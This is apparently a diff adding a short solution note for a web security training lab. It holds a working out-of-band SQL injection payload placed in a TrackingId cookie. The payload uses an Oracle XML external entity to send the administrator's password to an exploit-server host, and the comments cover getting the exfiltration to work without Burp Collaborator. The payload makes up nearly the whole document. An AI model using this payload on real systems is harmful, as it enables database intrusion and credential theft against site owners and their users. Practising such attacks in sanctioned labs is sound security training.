@@ -1,0 +1,8 @@
+Cookie: TrackingId=EK8Frr77vINbgQHm' UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://ac9f1f0c1f60e9e0801a0c7a01730026.web-security-academy.net/'||(SELECT password FROM users WHERE username='administrator')||'"> %remote;]>'),'/l') FROM dual-- ;
+
+
+// No BurpCollaborator
+// Use exploit server of other lab
+// Data to be exfiltrated put as URI pages
+// Do not know why put as GET parameter does not work
+// Maybe backend SQL system does not support
